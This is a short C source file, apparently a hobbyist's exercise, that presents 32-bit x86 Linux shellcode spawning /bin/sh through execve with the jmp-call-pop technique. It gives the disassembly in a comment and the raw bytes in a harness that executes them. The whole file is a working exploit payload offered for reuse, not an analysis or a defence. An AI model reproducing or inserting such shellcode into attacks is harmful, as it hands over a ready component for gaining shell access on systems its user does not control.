/*
 * newbie's execve /bin/sh shellcode, with pop method
 *
 * by Novice Live, http://novicelive.org :)
 *
 * feb 18, 2015
 */

/*
 * 08048054 <_start>:
 *  8048054:   eb 0b                   jmp    8048061 <just_before_str>
 *
 * 08048056 <execve_sh>:
 *  8048056:   31 c0                   xor    %eax,%eax
 *  8048058:   b0 0b                   mov    $0xb,%al
 *  804805a:   5b                      pop    %ebx
 *  804805b:   31 c9                   xor    %ecx,%ecx
 *  804805d:   31 d2                   xor    %edx,%edx
 *  804805f:   cd 80                   int    $0x80
 *
 * 08048061 <just_before_str>:
 *  8048061:   e8 f0 ff ff ff          call   8048056 <execve_sh>
 *  8048066:   2f                      das    
 *  8048067:   62 69 6e                bound  %ebp,0x6e(%ecx)
 *  804806a:   2f                      das    
 *  804806b:   73 68                   jae    80480d5 <just_before_str+0x74>
 */

#include <stdio.h>
#include <string.h>

int main(void)
{
    char *shellcode = "\xeb\x0b"
        "\x31\xc0"
        "\xb0\x0b"
        "\x5b"
        "\x31\xc9"
        "\x31\xd2"
        "\xcd\x80"
        "\xe8\xf0\xff\xff\xff"
        "\x2f"
        "\x62\x69\x6e"
        "\x2f"
        "\x73\x68";

    printf("strlen(shellcode): %d\n", strlen(shellcode));

    ((void (*)(void))shellcode)();

    return 0;
}
